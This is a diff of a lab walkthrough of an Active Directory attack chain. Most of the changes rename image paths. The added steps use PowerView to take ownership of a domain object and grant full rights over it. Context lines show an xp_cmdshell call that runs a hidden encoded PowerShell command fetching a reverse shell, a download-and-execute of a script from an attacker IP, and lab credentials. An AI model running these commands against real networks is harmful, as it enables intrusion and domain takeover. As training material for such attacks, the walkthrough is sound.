@@ -130,7 +130,7 @@ crackmapexec smb 10.0.0.3 10.0.0.4 10.0.0.5 -u richard -p Sample123 --shares
 
 After connecting to the share we see that this user can't access any of the subdirectories:
 
-![](<../../../../.gitbook/assets/image (73) (1).png>)
+![](<../../../../.gitbook/assets/image (73) (1) (1).png>)
 
 2\. Next we can check if the user can access any systems over winrm:
 
@@ -229,7 +229,7 @@ WHERE a.permission_name = 'IMPERSONATE'
 EXECUTE AS LOGIN = 'sa'
 ```
 
-![](<../../../../.gitbook/assets/image (46).png>)
+![](<../../../../.gitbook/assets/image (46) (1).png>)
 
 6\. Lets try to impersonate `developer_test` and then check for sysadmin privileges and if impersonation is possible again:
 
@@ -323,7 +323,7 @@ EXEC xp_cmdshell 'powershell.exe -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIA
 
 5\. Now its time to execute the command and receive a shell. Amsi.txt and the reverse shell gets downloaded and the shell comes in from `WEB01` as `NT service\mssql$dev`:
 
-![](<../../../../.gitbook/assets/image (16).png>)
+![](<../../../../.gitbook/assets/image (16) (1).png>)
 
 ### 6. Privesc RBCD
 
@@ -364,7 +364,7 @@ Then we can create our own computerobject with the name `FAKE01` and password `1
 New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
 ```
 
-![](<../../../../.gitbook/assets/image (73).png>)
+![](<../../../../.gitbook/assets/image (73) (1).png>)
 
 3\. The third requirement is that the WebDav director is installed. We can check this with the following PowerShell command in the shell:
 
@@ -568,7 +568,7 @@ We successfully cracked the hash of the `sa_sql` user, the password is `Iloveyou
 nslookup secure.local
 ```
 
-![](<../../../../.gitbook/assets/image (65).png>)
+![](<../../../../.gitbook/assets/image (65) (1).png>)
 
 2\. The IP for secure.local is `10.0.0.100`, we can quickly run Crackmapexec and see if we can connect to it over SMB:
 
@@ -588,7 +588,7 @@ bloodhound-python -d secure.local -ns 10.0.0.100 -dc DC03.secure.local -u 'sa_sq
 
 We were able to successfully gather the BloodHound data. We can load it by dragging it into BloodHound like we did earlier. We can also find the `sa_sql` user now:
 
-![](<../../../../.gitbook/assets/image (13).png>)
+![](<../../../../.gitbook/assets/image (13) (1).png>)
 
 4\. Click on the user and scroll down in the "Node Info" till the "Outbound Control Rights" section. If there is any data here, it means the object has control on another object. Lets click on the number "1".
 
@@ -597,6 +597,67 @@ We were able to successfully gather the BloodHound data. We can load it by dragg
 We see that the user has WriteOwner permissions:
 
 ![](<../../../../.gitbook/assets/image (67).png>)
+
+In BloodHound you can right click the Edge and click the ?Help function to get more information on how to abuse it:
+
+![](<../../../../.gitbook/assets/image (13).png>)
+
+5\. One tool to do these ACL abuses is [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) from PowerSploit. So lets download that and load it into memory in the shell we have on `WEB01`.
+
+```
+wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+iex (iwr http://192.168.248.2:8090/PowerView.ps1 -usebasicparsing)
+```
+
+We also need to create a credential object for the `sa_sql` user since we need to execute the commands as that user. We can do that with the following powershell commands:
+
+```
+$password = ConvertTo-SecureString 'Iloveyou2' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential('secure.local\sa_sql', $password)
+```
+
+The credentials are saved in the `$creds` variable now:
+
+![](<../../../../.gitbook/assets/image (46).png>)
+
+6\. Now we can use PowerView to query the domain controller from `secure.local` for the domain-object `DATA01` and retrieve the samaccountname and Owner attribute. We will receive a SID which we need to resolve as well;
+
+```
+Get-DomainObject -Identity data01 -SecurityMasks Owner -Domain secure.local -Credential $creds -Server 10.0.0.100 | select samaccountname, Owner
+Get-DomainObject -Identity S-1-5-21-1498997062-1091976085-892328878-512 -Domain secure.local -Credential $creds -Server 10.0.0.100
+```
+
+![](<../../../../.gitbook/assets/image (73).png>)
+
+7\. The current owner of `DATA01` is the Domain Admins group. Lets change that. We can change the owner of the object using the `Set-DomainObjectOwner` cmdlet. The command below will change the owner to `sa_sql`.
+
+```
+Set-DomainObjectOwner -Domain secure.local -Credential $creds -Server 10.0.0.100 -Identity DATA01 -OwnerIdentity sa_sql -Verbose
+```
+
+![](<../../../../.gitbook/assets/image (43).png>)
+
+We didn't received any output, but we can execute the commands again to see who the owner is now.
+
+![](<../../../../.gitbook/assets/image (19).png>)
+
+The owner successfully changed.
+
+8\. Since we are the owner of the object now we can change the permissions we have on the object. We can give ourself genericall rights. This can be done with PowerView and the cmdlet `Add-DomainObjectAcl`.
+
+```
+Add-DomainObjectAcl -Domain secure.local -Credential $creds -TargetDomain secure.local -TargetIdentity DATA01 -PrincipalDomain secure.local -PrincipalIdentity sa_sql -Rights All -Verbose
+```
+
+![](<../../../../.gitbook/assets/image (16).png>)
+
+9\. We didn't reveive any output but now we can check the current permissions by running BloodHound again and ingesting the data:
+
+![](<../../../../.gitbook/assets/image (65).png>)
+
+10\. We have a lot of permissions now. Since DATA01 doesn't have LAPS installed unfortunatelly, we need to execute another Resource Based Constrained Delegation attack.
+
+
 
 ### 11. Dumping DPAPI
 
